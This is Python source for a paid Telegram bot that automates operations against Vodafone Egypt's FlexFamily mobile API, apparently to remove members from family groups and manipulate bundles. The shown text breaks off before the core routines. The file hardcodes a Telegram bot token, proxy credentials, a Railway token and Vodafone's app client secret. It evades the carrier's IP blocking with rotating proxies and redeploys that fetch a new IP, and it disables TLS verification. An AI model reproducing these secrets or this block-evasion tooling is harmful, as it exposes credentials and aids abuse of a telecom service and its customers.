#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Vodafone Egypt FlexFamily Telegram Bot — Production Ready
PostgreSQL + Thread-safe concurrency + Railway deployment
"""

import os
import time
import json
import random
import threading
import traceback
import asyncio
from urllib.parse import quote

import telebot
from telebot import types
import aiohttp
import requests
import psycopg2
from psycopg2 import pool as pg_pool
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ════════════════════════════════════════════════════════════════
# ⚙️ Configuration — from environment variables ONLY
# ════════════════════════════════════════════════════════════════
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8861811511:AAFILaK8QCxc-9wqiiPT69UqCj8I7mkVobs")
DEFAULT_ADMIN_ID = int(os.environ.get("DEFAULT_ADMIN_ID", "1659236364"))
ADMIN_IDS = {DEFAULT_ADMIN_ID}
CHANNEL_USERNAME = "@AJVIPX"
CHANNEL_URL = "https://t.me/AJVIPX"

BOT_OPEN = True
USE_PROXY = False
PROXY_URL = os.environ.get("PROXY_URL", "http://brd-customer-hl_ad9aacb7-zone-mobile_proxy1:1su3yq7etive@brd.superproxy.io:33335")

DELAY_BETWEEN_LOGINS = 1.5
DELAY_AFTER_LOGIN = 3
DELAY_BETWEEN_RETRIES = 10   # 10 ثواني بين كل جولة تطيير

# ════════════════════════════════════════════════════════════════
# 🛡️ IP Health Monitor — يكشف حظر IP من فودافون ويتعامل معاه
# ════════════════════════════════════════════════════════════════
_ip_health = {"blocked": False, "last_check": 0, "fail_count": 0, "total_requests": 0}
_ip_health_lock = threading.Lock()
_IP_CHECK_INTERVAL = 60       # فحص كل 60 ثانية
_IP_MAX_FAIL_BEFORE_ALERT = 5 # تنبيه بعد 5 فشلات متتالية
_IP_COOLDOWN_ON_BLOCK = 300   # انتظار 5 دقائق عند الحظر

def _check_ip_health():
    """فحص صحة IP عن طريق محاولة تسجيل دخول تجريبية."""
    global _ip_health
    with _ip_health_lock:
        if _ip_health["blocked"]:
            return _ip_health["blocked"]
    try:
        # محاولة بسيطة على Vodafone API
        test_payload = {
            "grant_type": "password", "username": "0", "password": "0",
            "client_id": "ana-vodafone-app",
            "client_secret": "95fd95fb-7489-4958-8ae6-d31a525cd20a",
        }
        headers = {"User-Agent": "okhttp/4.11.0", "Content-Type": "application/x-www-form-urlencoded"}
        proxies = {"http": PROXY_URL, "https": PROXY_URL} if USE_PROXY else None
        r = requests.post(AUTH_URL, data=test_payload, headers=headers, timeout=10, proxies=proxies, verify=False)
        with _ip_health_lock:
            _ip_health["total_requests"] += 1
            _ip_health["last_check"] = time.time()
            # HTTP 403 أو connection error = IP محظور
            if r.status_code == 403:
                _ip_health["fail_count"] += 1
                if _ip_health["fail_count"] >= _IP_MAX_FAIL_BEFORE_ALERT:
                    _ip_health["blocked"] = True
                    print("[IP_HEALTH] ⚠️ IP محظور من فودافون! تم تفعيل وضع الحماية.")
                    # إشعار الأدمن
                    for admin_id in ADMIN_IDS:
                        safe_send(admin_id,
                            "🚨 *تنبيه: IP السيرفر محظور!*\n\n"
                            "فودافون قامت بحظر IP السيرفر بعد عدد كبير من الطلبات.\n\n"
                            "⚠️ العمليات الجديدة لن تبدأ حتى يتم حل المشكلة.\n"
                            "💡 استخدم زر *إعادة تشغيل السيرفر* في لوحة التحكم للحصول على IP جديد.",
                            parse_mode="Markdown")
                return _ip_health["blocked"]
            else:
                _ip_health["fail_count"] = 0
                _ip_health["blocked"] = False
                return False
    except requests.exceptions.ConnectionError:
        with _ip_health_lock:
            _ip_health["fail_count"] += 1
            _ip_health["last_check"] = time.time()
            if _ip_health["fail_count"] >= _IP_MAX_FAIL_BEFORE_ALERT:
                _ip_health["blocked"] = True
                print("[IP_HEALTH] ⚠️ Connection error — IP might be blocked!")
            return _ip_health["blocked"]
    except Exception as e:
        print(f"[IP_HEALTH] Error checking IP: {e}")
        with _ip_health_lock:
            _ip_health["last_check"] = time.time()
        return False

def is_ip_blocked():
    """هل IP محظور حالياً؟"""
    with _ip_health_lock:
        return _ip_health["blocked"]

def unblock_ip():
    """محاولة إلغاء حظر IP."""
    with _ip_health_lock:
        _ip_health["blocked"] = False
        _ip_health["fail_count"] = 0
    # فحص فوري
    _check_ip_health()

def _ip_monitor_loop():
    """حلقة مراقبة IP في الخلفية."""
    while True:
        try:
            time.sleep(_IP_CHECK_INTERVAL)
            _check_ip_health()
        except Exception as e:
            print(f"[IP_MONITOR] Error: {e}")
            time.sleep(30)

def railway_restart():
    """إعادة تشغيل السيرفر عبر Railway API للحصول على IP جديد."""
    railway_token = os.environ.get("RAILWAY_TOKEN", "72744c69-8337-4143-b96c-915d07be8e61")
    railway_service_id = os.environ.get("RAILWAY_SERVICE_ID", "84b9aef2-fc1a-4d73-a055-d540f0ce06fd")
    railway_environment_id = os.environ.get("RAILWAY_ENVIRONMENT_ID", "96de0d01-87ee-4870-88ae-8961ebbcd56f")
    if not railway_token or not railway_service_id:
        return False, "❌ لم يتم إعداد RAILWAY_TOKEN أو RAILWAY_SERVICE_ID"
    try:
        url = "https://backboard.railway.com/graphql/v2"
        headers = {"Authorization": f"Bearer {railway_token}", "Content-Type": "application/json"}
        query = """
        mutation($serviceId: String!, $environmentId: String!) {
            deploymentCreate(input: {serviceId: $serviceId, environmentId: $environmentId}) {
                id
            }
        }
        """
        r = requests.post(url, json={"query": query, "variables": {"serviceId": railway_service_id, "environmentId": railway_environment_id}}, headers=headers, timeout=30)
        if r.status_code == 200:
            data = r.json()
            if "data" in data and data.get("data", {}).get("deploymentCreate"):
                return True, "✅ تم طلب إعادة نشر السيرفر! سيتم تعيين IP جديد خلال دقائق.\n\n⚠️ العملية الحالية ستتوقف."
            if "errors" in data:
                err_msg = data["errors"][0].get("message", "خطأ غير معروف")
                return False, f"❌ خطأ Railway: {err_msg}"
            return False, f"❌ استجابة غير متوقعة: {r.text[:200]}"
        return False, f"❌ فشل الاتصال بـ Railway (HTTP {r.status_code})"
    except Exception as e:
        return False, f"❌ خطأ: {e}"
# بدء مراقبة IP في الخلفية
threading.Thread(target=_ip_monitor_loop, daemon=True, name="ip-monitor").start()

# ════════════════════════════════════════════════════════════════
# 🗄️ PostgreSQL — ThreadedConnectionPool
# ════════════════════════════════════════════════════════════════
DATABASE_URL = (
    os.environ.get("DATABASE_URL")
    or os.environ.get("DATABASE_PUBLIC_URL")
    or os.environ.get("POSTGRES_URL")
    or os.environ.get("POSTGRESQL_URL")
    or os.environ.get("PG_URL")
    or ""
)

if DATABASE_URL and "sslmode" not in DATABASE_URL:
    DATABASE_URL = DATABASE_URL + "?sslmode=require"

_db_pool = None

def _init_pool():
    global _db_pool
    if not DATABASE_URL:
        print("❌ ERROR: No DATABASE_URL found in environment variables")
        print("   Set one of: DATABASE_URL, DATABASE_PUBLIC_URL, POSTGRES_URL, POSTGRESQL_URL, PG_URL")
        raise SystemExit(1)
    try:
        _db_pool = pg_pool.ThreadedConnectionPool(
            minconn=2,
            maxconn=20,
            dsn=DATABASE_URL
        )
        print(f"✅ PostgreSQL pool created (min=2, max=20)")
    except Exception as e:
        print(f"❌ Failed to create DB pool: {e}")
        raise SystemExit(1)

def _get_conn():
    if _db_pool is None:
        return None
    try:
        return _db_pool.getconn()
    except Exception as e:
        print(f"[_get_conn] Error: {e}")
        return None

def _put_conn(conn):
    if conn is None:
        return
    try:
        if _db_pool:
            _db_pool.putconn(conn)
    except Exception:
        try:
            conn.close()
        except Exception:
            pass

def _db_exec(query, params=None, fetch=False, fetchone=False, commit=False):
    """Generic DB helper with automatic pool get/put."""
    conn = _get_conn()
    if conn is None:
        return None
    try:
        conn.autocommit = False
        cur = conn.cursor()
        cur.execute(query, params)
        if commit:
            conn.commit()
        if fetchone:
            row = cur.fetchone()
            return row
        if fetch:
            return cur.fetchall()
        return True
    except Exception as e:
        print(f"[_db_exec] Error: {e} | Query: {query[:80]}")
        try:
            conn.rollback()
        except Exception:
            pass
        return None
    finally:
        _put_conn(conn)

def _init_db():
    """Create tables if they don't exist."""
    print("🗄️ Initializing database tables...")
    _db_exec("""
        CREATE TABLE IF NOT EXISTS subscribers (
            user_id     BIGINT PRIMARY KEY,
            added_at    TIMESTAMP DEFAULT NOW(),
            added_by    BIGINT DEFAULT 0,
            note        TEXT DEFAULT '',
            expiry_days INTEGER DEFAULT 0,
            sub_type    TEXT DEFAULT 'days',
            stars       INTEGER DEFAULT 0
        )
    """, commit=True)
    _db_exec("""
        CREATE TABLE IF NOT EXISTS usage_stats (
            id         SERIAL PRIMARY KEY,
            user_id    BIGINT,
            service    TEXT,
            success    INTEGER,
            created_at TIMESTAMP DEFAULT NOW()
        )
    """, commit=True)
    _db_exec("""
        CREATE TABLE IF NOT EXISTS users (
            user_id   BIGINT PRIMARY KEY,
            first_seen TIMESTAMP DEFAULT NOW()
        )
    """, commit=True)
    print("✅ Database tables ready (PostgreSQL)")

# ── Subscriber DB functions ────────────────────────────────────

def is_subscriber(uid):
    if uid in ADMIN_IDS:
        return True
    row = _db_exec("SELECT 1 FROM subscribers WHERE user_id = %s", (uid,), fetchone=True)
    return row is not None

def add_subscriber(uid, added_by=0, note="", days=0, sub_type="days", stars=0):
    return _db_exec(
        """INSERT INTO subscribers (user_id, added_by, note, expiry_days, sub_type, stars)
           VALUES (%s, %s, %s, %s, %s, %s)
           ON CONFLICT (user_id) DO UPDATE SET
               added_by = EXCLUDED.added_by, note = EXCLUDED.note,
               expiry_days = EXCLUDED.expiry_days, sub_type = EXCLUDED.sub_type,
               stars = EXCLUDED.stars""",
        (uid, added_by, note, days, sub_type, stars), commit=True
    ) is not None

def remove_subscriber(uid):
    return _db_exec("DELETE FROM subscribers WHERE user_id = %s", (uid,), commit=True) is not None

def get_subscribers_details():
    rows = _db_exec(
        "SELECT user_id, added_at, added_by, note, expiry_days, sub_type, stars FROM subscribers ORDER BY added_at DESC",
        fetch=True
    )
    if not rows:
        return []
    result = []
    for row in rows:
        uid, added_at, added_by, note, days, sub_type, stars = row
        result.append({
            "user_id": uid, "added_at": added_at, "added_by": added_by,
            "note": note or "", "expiry_days": days or 0,
            "sub_type": sub_type or "days", "stars": stars or 0
        })
    return result

def get_subscriber_info(uid):
    row = _db_exec(
        "SELECT user_id, added_at, added_by, note, expiry_days, sub_type, stars FROM subscribers WHERE user_id = %s",
        (uid,), fetchone=True
    )
    if not row:
        return None
    return {
        "user_id": row[0], "added_at": row[1], "added_by": row[2],
        "note": row[3] or "", "expiry_days": row[4] or 0,
        "sub_type": row[5] or "days", "stars": row[6] or 0
    }

def get_subscriber_stars(uid):
    row = _db_exec("SELECT stars FROM subscribers WHERE user_id = %s", (uid,), fetchone=True)
    return row[0] if row else 0

def deduct_star(uid):
    conn = _get_conn()
    if conn is None:
        return False
    try:
        cur = conn.cursor()
        cur.execute("UPDATE subscribers SET stars = stars - 1 WHERE user_id = %s AND stars > 0", (uid,))
        conn.commit()
        return cur.rowcount > 0
    except Exception as e:
        print(f"[deduct_star] Error: {e}")
        return False
    finally:
        _put_conn(conn)

def add_stars(uid, count):
    conn = _get_conn()
    if conn is None:
        return False
    try:
        cur = conn.cursor()
        cur.execute("UPDATE subscribers SET stars = stars + %s WHERE user_id = %s", (count, uid))
        conn.commit()
        return True
    except Exception as e:
        print(f"[add_stars] Error: {e}")
        return False
    finally:
        _put_conn(conn)

def del_stars(uid, count):
    conn = _get_conn()
    if conn is None:
        return False
    try:
        cur = conn.cursor()
        cur.execute("UPDATE subscribers SET stars = GREATEST(stars - %s, 0) WHERE user_id = %s", (count, uid))
        conn.commit()
        return True
    except Exception as e:
        print(f"[del_stars] Error: {e}")
        return False
    finally:
        _put_conn(conn)

def record_to_db(uid, svc, ok):
    _db_exec(
        "INSERT INTO usage_stats (user_id, service, success) VALUES (%s, %s, %s)",
        (uid, svc, int(ok)), commit=True
    )

def register_user(uid):
    _db_exec(
        "INSERT INTO users (user_id, first_seen) VALUES (%s, NOW()) ON CONFLICT (user_id) DO NOTHING",
        (uid,), commit=True
    )

def get_user_activity_from_db(uid=0, limit=50):
    if uid:
        rows = _db_exec(
            "SELECT user_id, service, success, created_at FROM usage_stats WHERE user_id = %s AND success = 1 ORDER BY created_at DESC LIMIT %s",
            (uid, limit), fetch=True
        )
    else:
        rows = _db_exec(
            "SELECT user_id, service, success, created_at FROM usage_stats WHERE success = 1 ORDER BY created_at DESC LIMIT %s",
            (limit,), fetch=True
        )
    if not rows:
        return []
    return [{"user_id": r[0], "service": r[1], "success": r[2], "created_at": str(r[3])} for r in rows]

def get_user_stats_summary():
    rows = _db_exec("""
        SELECT user_id,
               SUM(CASE WHEN success = 1 THEN 1 ELSE 0 END) AS success_count,
               SUM(CASE WHEN success = 0 THEN 1 ELSE 0 END) AS fail_count,
               MAX(created_at) AS last_activity
        FROM usage_stats
        GROUP BY user_id
        ORDER BY success_count DESC
    """, fetch=True)
    if not rows:
        return []
    return [{"user_id": r[0], "success": r[1], "fail": r[2], "last_activity": str(r[3])} for r in rows]

# ════════════════════════════════════════════════════════════════
# 🔐 Per-user lock & state management — CONCURRENCY FIX
# ════════════════════════════════════════════════════════════════
_user_locks = {}
_user_locks_meta = threading.Lock()

def get_user_lock(uid):
    with _user_locks_meta:
        if uid not in _user_locks:
            _user_locks[uid] = threading.Lock()
        return _user_locks[uid]

_user_states = {}
_user_stop_events = {}
_user_accept_resp = {}
_user_retry_resp = {}
_user_skip_resp = {}

def set_user_state(uid, key, value):
    with get_user_lock(uid):
        if uid not in _user_states:
            _user_states[uid] = {}
        _user_states[uid][key] = value

def get_user_state(uid, key, default=None):
    with get_user_lock(uid):
        if uid in _user_states:
            return _user_states[uid].get(key, default)
        return default

def pop_user_state(uid, key, default=None):
    with get_user_lock(uid):
        if uid in _user_states:
            return _user_states[uid].pop(key, default)
        return default

def clear_user_state(uid):
    with get_user_lock(uid):
        _user_states.pop(uid, None)

def get_user_stop_event(uid):
    with get_user_lock(uid):
        if uid not in _user_stop_events:
            _user_stop_events[uid] = threading.Event()
        return _user_stop_events[uid]

def pop_user_stop_event(uid):
    with get_user_lock(uid):
        return _user_stop_events.pop(uid, None)

def set_accept_resp(uid, value):
    with get_user_lock(uid):
        _user_accept_resp[uid] = value

def pop_accept_resp(uid, default=None):
    with get_user_lock(uid):
        return _user_accept_resp.pop(uid, default)

def set_retry_resp(uid, value):
    with get_user_lock(uid):
        _user_retry_resp[uid] = value

def pop_retry_resp(uid, default=None):
    with get_user_lock(uid):
        return _user_retry_resp.pop(uid, default)

def set_skip_resp(uid, value):
    with get_user_lock(uid):
        _user_skip_resp[uid] = value

def pop_skip_resp(uid, default=None):
    with get_user_lock(uid):
        return _user_skip_resp.pop(uid, default)

# ── Active operations tracking ─────────────────────────────────
active_operations = {}
_active_ops_lock = threading.Lock()

def start_op(uid, service, owner=""):
    with _active_ops_lock:
        active_operations[uid] = {"service": service, "started_at": time.time(), "owner": owner}

def end_op(uid):
    with _active_ops_lock:
        active_operations.pop(uid, None)

# ── Step progress tracking ─────────────────────────────────────
_step_progress = {}   # {uid: {"service": str, "steps": {step_name: "done"|"fail"|"skip"|"running"}, "started_at": float}}
_step_progress_lock = threading.Lock()

def init_progress(uid, service, steps_list):
    """Initialize progress tracking for a user operation."""
    with _step_progress_lock:
        _step_progress[uid] = {
            "service": service,
            "steps": {s: "pending" for s in steps_list},
            "started_at": time.time(),
        }

def set_progress(uid, step_name, status):
    """Set step status: 'running', 'done', 'fail', 'skip'."""
    with _step_progress_lock:
        if uid in _step_progress:
            _step_progress[uid]["steps"][step_name] = status

def clear_progress(uid):
    """Remove progress entry."""
    with _step_progress_lock:
        _step_progress.pop(uid, None)

def get_all_progress():
    """Return a copy of all progress data."""
    with _step_progress_lock:
        return {uid: dict(info) for uid, info in _step_progress.items()}

def get_user_progress(uid):
    """Return progress for a specific user, or None."""
    with _step_progress_lock:
        info = _step_progress.get(uid)
        if info:
            return {"service": info["service"], "steps": dict(info["steps"]), "started_at": info["started_at"]}
        return None

def _fmt_progress_text(progress_data, uid):
    """Format a progress dict into a readable Markdown text."""
    service = progress_data.get("service", "")
    steps = progress_data.get("steps", {})
    started = progress_data.get("started_at", time.time())
    elapsed = int(time.time() - started)
    mins, secs = divmod(elapsed, 60)

    icons = {
        "pending": "⬜",
        "running": "🔵",
        "done":    "✅",
        "fail":    "❌",
        "skip":    "⏭️",
    }

    uname = _resolve_username(uid)
    uname_safe = uname.replace('_', '\\_')
    lines = [f"👤 *@{uname_safe}* (`{uid}`) — {mins}:{secs:02d}\n  الخدمة: *{service}*\n"]
    for i, (step_name, status) in enumerate(steps.items(), 1):
        icon = icons.get(status, "❓")
        lines.append(f"  {icon} {step_name}")
    return "\n".join(lines)

def _fmt_progress_text_subscriber(progress_data, uid):
    """Format progress for subscribers — step number + status only, NO details."""
    service = progress_data.get("service", "")
    steps = progress_data.get("steps", {})
    started = progress_data.get("started_at", time.time())
    elapsed = int(time.time() - started)
    mins, secs = divmod(elapsed, 60)
    total = len(steps)
    done_count = sum(1 for s in steps.values() if s == "done")

    icons = {
        "pending": "⬜",
        "running": "🔵",
        "done":    "✅",
        "fail":    "❌",
        "skip":    "⏭️",
    }

    uname = _resolve_username(uid)
    uname_safe = uname.replace('_', '\\_')
    now_h, now_m = time.localtime(time.time())[3:5]
    lines = [
        f"📊 تقدم عمليتك ({done_count}/{total})\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 @{uname_safe} (`{uid}`) — {now_h}:{now_m:02d}\n"
        f"الخدمة: {service}\n"
    ]
    for i, (step_name, status) in enumerate(steps.items(), 1):
        icon = icons.get(status, "❓")
        lines.append(f"{icon} الخطوة {i}")
    return "\n".join(lines)

def build_progress_dashboard():
    """Build a dashboard text showing all active user operations progress."""
    all_prog = get_all_progress()
    if not all_prog:
        return "📋 لا توجد عمليات جارية حالياً.", 0

    count = len(all_prog)
    texts = []
    uids_for_resolve = list(all_prog.keys())
    _resolve_usernames_async(uids_for_resolve)

    for uid, info in all_prog.items():
        texts.append(_fmt_progress_text(info, uid))

    header = f"📊 *تقدم العمليات النشطة* ({count})\n" + "━━━━━━━━━━━━━━━━━━━━\n\n"
    return header + "\n\n".join(texts), count

# ── Users seen ─────────────────────────────────────────────────
users_seen = set()
_users_seen_lock = threading.Lock()
_username_cache = {}
_uname_lock = threading.Lock()

# ════════════════════════════════════════════════════════════════
# 🤖 Bot initialization
# ════════════════════════════════════════════════════════════════
bot = telebot.TeleBot(BOT_TOKEN, num_threads=50)

# ════════════════════════════════════════════════════════════════
# 📊 Statistics
# ════════════════════════════════════════════════════════════════
stats = {
    "تطيير فردي": {"success": 0, "fail": 0},
    "عملية متعددة": {"success": 0, "fail": 0},
    "فحص التأهيل": {"success": 0, "fail": 0},
    "نوتة كل الأنظمة": {"success": 0, "fail": 0},
    "نوتة فليكس 15": {"success": 0, "fail": 0},
    "تزويد أيام": {"success": 0, "fail": 0},
}
_stats_lock = threading.Lock()

def record(svc, ok, uid=0):
    with _stats_lock:
        stats[svc]["success" if ok else "fail"] += 1
    if uid:
        threading.Thread(target=record_to_db, args=(uid, svc, ok), daemon=True).start()

# ════════════════════════════════════════════════════════════════
# 🔗 Vodafone API URLs
# ════════════════════════════════════════════════════════════════
AUTH_URL = "https://mobile.vodafone.com.eg/auth/realms/vf-realm/protocol/openid-connect/token"
MOBILE_URL = "https://mobile.vodafone.com.eg/services/dxl/cg/customerGroupAPI/customerGroup"
WEB_FAMILY_URL = "https://web.vodafone.com.eg/services/dxl/cg/customerGroupAPI/customerGroup"
ELIGIBILITY_URL = "https://mobile.vodafone.com.eg/services/dxl/poq/productOfferingQualificationManagement/v1/productOfferingQualification/FlexACP"
ORDER_URL_MOBILE = "https://mobile.vodafone.com.eg/services/dxl/orderor/productOrder"
ORDER_URL_POM = "https://mobile.vodafone.com.eg/services/dxl/pom/productOrder"
ORDER_URL_WEB = "https://web.vodafone.com.eg/services/dxl/pom/productOrder"

BUNDLES_ALL = [
    {"name": "فليكس 15", "id": "Flex_17.5_2019", "price": 20.0},
    {"name": "فليكس 45", "id": "Flex_2024_627", "price": 45.0},
    {"name": "فليكس 70", "id": "Flex_2024_629", "price": 70.0},
    {"name": "فليكس 100", "id": "Flex_2024_631", "price": 100.0},
    {"name": "فليكس 150", "id": "Flex_2024_633", "price": 150.0},
    {"name": "فليكس 300", "id": "Flex_2024_637", "price": 300.0},
]
BUNDLE_NOTA15 = {"id": "Flex_2021_523", "target": "Flex_17.5_2019"}

USER_AGENTS_APPLE = [
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
]

# ════════════════════════════════════════════════════════════════
# 🛡️ Safe messaging — per-user send locks, flood control, 429 retry
# ════════════════════════════════════════════════════════════════
_user_send_locks_map = {}
_user_send_locks_meta = threading.Lock()
_last_send_time = {}
_last_send_lock = threading.Lock()
_send_times = []
_flood_lock = threading.Lock()

def _get_user_send_lock(uid):
    with _user_send_locks_meta:
        if uid not in _user_send_locks_map:
            _user_send_locks_map[uid] = threading.Lock()
        return _user_send_locks_map[uid]

def _check_flood():
    now = time.time()
    with _flood_lock:
        _send_times[:] = [t for t in _send_times if now - t < 1.0]
        if len(_send_times) >= 25:
            time.sleep(0.05)
        _send_times.append(now)

def safe_send(uid, text, **kwargs):
    now = time.time()
    with _last_send_lock:
        last = _last_send_time.get(uid, 0)
        gap = now - last
        delay = (0.35 - gap) if 0 <= gap < 0.35 else 0
        _last_send_time[uid] = now + delay
    if delay > 0:
        time.sleep(delay)
    _check_flood()
    user_lock = _get_user_send_lock(uid)
    for attempt in range(3):
        try:
            with user_lock:
                return bot.send_message(uid, text, **kwargs)
        except telebot.apihelper.ApiTelegramException as e:
            if "429" in str(e):
                time.sleep(2 + attempt * 3)
                continue
            break
        except Exception:
            break
    return None

def safe_edit(uid, mid, text, **kwargs):
    _check_flood()
    for attempt in range(2):
        try:
            return bot.edit_message_text(text, uid, mid, **kwargs)
        except telebot.apihelper.ApiTelegramException as e:
            if "429" in str(e):
                time.sleep(2 + attempt * 2)
                continue
            break
        except Exception:
            break
    return None

# ════════════════════════════════════════════════════════════════
# 🔐 Access control
# ════════════════════════════════════════════════════════════════
STAR_SERVICE_RULES = {
    "🚀 تطيير فردي": {"access": "blocked"},
    "🔗 عملية متعددة": {"access": "star"},
    "🔍 فحص التأهيل": {"access": "free"},
    "📦 نوتة كل الأنظمة": {"access": "blocked"},
    "⚡ نوتة فليكس 15": {"access": "blocked"},
    "📅 تزويد أيام": {"access": "free"},
}

def is_admin(uid):
    return uid in ADMIN_IDS

def check_service_access(uid, service):
    if is_admin(uid):
        return "ok"
    sub = get_subscriber_info(uid)
    if sub and sub.get("sub_type") == "stars":
        rule = STAR_SERVICE_RULES.get(service, {"access": "blocked"})
        if rule["access"] == "blocked":
            return "star_blocked"
        if rule["access"] == "star" and sub.get("stars", 0) <= 0:
            return "no_stars"
        return "ok"
    return "ok"

def check_access(uid, require_sub=False):
    if is_admin(uid):
        return "ok"
    if require_sub and not is_subscriber(uid):
        return "need_sub"
    if not BOT_OPEN and not is_subscriber(uid):
        return "need_sub"
    if is_ip_blocked():
        return "ip_blocked"
    return "ok"

def send_no_access_msg(uid):
    safe_send(uid,
        "⛔ *ليس لديك صلاحية استخدام هذا البوت.*\n\n"
        "البوت متاح للمشتركين فقط حالياً.\n"
        "تواصل مع المشرف للحصول على اشتراك.",
        parse_mode="Markdown")

def send_ip_blocked_msg(uid):
    safe_send(uid,
        "🚨 *عذراً، السيرفر غير متاح حالياً.*\n\n"
        "فودافون قامت بحظر IP السيرفر مؤقتاً.\n"
        "سيتم إعادة التشغيل تلقائياً.\n\n"
        "يرجى المحاولة لاحقاً.",
        parse_mode="Markdown")

# ════════════════════════════════════════════════════════════════
# ⌨️ Keyboards
# ════════════════════════════════════════════════════════════════
def main_kb(uid):
    kb = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    kb.add(
        types.KeyboardButton("🚀 تطيير فردي"),
        types.KeyboardButton("🔗 عملية متعددة"),
        types.KeyboardButton("🔍 فحص التأهيل"),
        types.KeyboardButton("📦 نوتة كل الأنظمة"),
        types.KeyboardButton("⚡ نوتة فليكس 15"),
        types.KeyboardButton("📅 تزويد أيام"),
    )
    if is_admin(uid):
        kb.add(types.KeyboardButton("🎛️ لوحة التحكم"))
    return kb

def op_kb(uid=0):
    kb = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    kb.add(
        types.KeyboardButton("🛑 إيقاف العملية"),
        types.KeyboardButton("📊 تقدم عمليتي"),
    )
    if uid and is_admin(uid):
        kb.add(types.KeyboardButton("🎛️ لوحة التحكم"))
    return kb

def admin_inline_kb():
    """أزرار لوحة التحكم — مقسمة لأقسام منفصلة + أزرار الإدارة."""
    global BOT_OPEN, USE_PROXY
    toggle = "🔴 إغلاق البوت" if BOT_OPEN else "🟢 فتح البوت"
    prx = "🔵 إيقاف البروكسي" if USE_PROXY else "⚪ تشغيل البروكسي"
    mk = types.InlineKeyboardMarkup(row_width=2)
    mk.add(
        types.InlineKeyboardButton("📊 الحالة العامة", callback_data="adm_section_status"),
        types.InlineKeyboardButton("🔗 العمليات النشطة", callback_data="adm_section_ops"),
        types.InlineKeyboardButton("📈 الإحصائيات", callback_data="adm_section_stats"),
        types.InlineKeyboardButton("👥 المشتركون", callback_data="adm_section_subs"),
        types.InlineKeyboardButton("📋 تتبع المستخدمين", callback_data="adm_section_track"),
    )
    mk.add(
        types.InlineKeyboardButton("📊 تقدم العمليات", callback_data="adm_progress"),
    )
    mk.add(
        types.InlineKeyboardButton(toggle, callback_data="adm_toggle_open"),
        types.InlineKeyboardButton(prx, callback_data="adm_toggle_proxy"),
    )
    mk.add(
        types.InlineKeyboardButton("➕ إضافة مشترك", callback_data="adm_add_sub"),
        types.InlineKeyboardButton("➕ إضافة مشترك (بأيام)", callback_data="adm_add_sub_days"),
        types.InlineKeyboardButton("⭐ إضافة مشترك (بنجوم)", callback_data="adm_add_sub_stars"),
        types.InlineKeyboardButton("➕ إضافة نجوم", callback_data="adm_add_stars"),
    )
    mk.add(
        types.InlineKeyboardButton("➖ حذف نجوم", callback_data="adm_del_stars"),
        types.InlineKeyboardButton("➖ حذف مشترك", callback_data="adm_del_sub"),
    )
    mk.add(
        types.InlineKeyboardButton("🔄 تحديث", callback_data="adm_refresh"),
        types.InlineKeyboardButton("🔁 إعادة تشغيل السيرفر", callback_data="adm_restart_railway"),
    )
    return mk

def _adm_section_kb(section):
    """أزرار العودة لأقسام لوحة التحكم."""
    mk = types.InlineKeyboardMarkup()
    mk.add(
        types.InlineKeyboardButton("🔄 تحديث", callback_data=f"adm_section_{section}"),
        types.InlineKeyboardButton("🔙 الرجوع", callback_data="adm_back_dashboard"),
    )
    return mk

# ════════════════════════════════════════════════════════════════
# 👤 Username resolution
# ════════════════════════════════════════════════════════════════
def _resolve_username(uid):
    with _uname_lock:
        if uid in _username_cache:
            return _username_cache[uid]
    try:
        chat = bot.get_chat(uid)
        name = chat.username if hasattr(chat, 'username') and chat.username else (
            chat.first_name if hasattr(chat, 'first_name') else str(uid))
    except Exception:
        name = str(uid)
    with _uname_lock:
        _username_cache[uid] = name
    return name

def _resolve_usernames_async(uids):
    def _do():
        for u in uids:
            _resolve_username(u)
    threading.Thread(target=_do, daemon=True).start()

# ════════════════════════════════════════════════════════════════
# 📋 Admin dashboard
# ════════════════════════════════════════════════════════════════
def admin_dashboard():
    """عرض لوحة التحكم الرئيسية — ملخص مختصر مع أزرار لكل قسم."""
    global BOT_OPEN, USE_PROXY
    bot_st = "🟢 مفتوح" if BOT_OPEN else "🔴 مغلق"
    prx_st = "🔵 يعمل" if USE_PROXY else "⚪ معطّل"
    subs = get_subscribers_details()
    with _active_ops_lock:
        ops_count = len(active_operations)
    return (
        "🎛️ *لوحة التحكم*\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        f"البوت: {bot_st}  |  البروكسي: {prx_st}\n"
        f"👥 المستخدمون: *{len(users_seen)}*  |  ⭐ المشتركون: *{len(subs)}*\n"
        f"🔗 العمليات النشطة: *{ops_count}*\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "📌 اختر القسم المطلوب من الأزرار أدناه:"
    )

def admin_section_status():
    """قسم الحالة العامة."""
    global BOT_OPEN, USE_PROXY
    bot_st = "🟢 مفتوح" if BOT_OPEN else "🔴 مغلق"
    prx_st = "🔵 يعمل" if USE_PROXY else "⚪ معطّل"
    subs = get_subscribers_details()
    with _active_ops_lock:
        ops_count = len(active_operations)
    total_ok = sum(v["success"] for v in stats.values())
    total_fail = sum(v["fail"] for v in stats.values())
    return (
        "📊 *الحالة العامة*\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        f"البوت: {bot_st}\n"
        f"البروكسي: {prx_st}\n"
        f"👥 المستخدمون: *{len(users_seen)}*\n"
        f"⭐ المشتركون: *{len(subs)}*\n"
        f"🔗 العمليات النشطة: *{ops_count}*\n"
        f"✅ إجمالي النجاح: *{total_ok}*\n"
        f"❌ إجمالي الفشل: *{total_fail}*"
    )

def admin_section_operations():
    """قسم العمليات النشطة."""
    ops_lines = []
    ops_uids = []
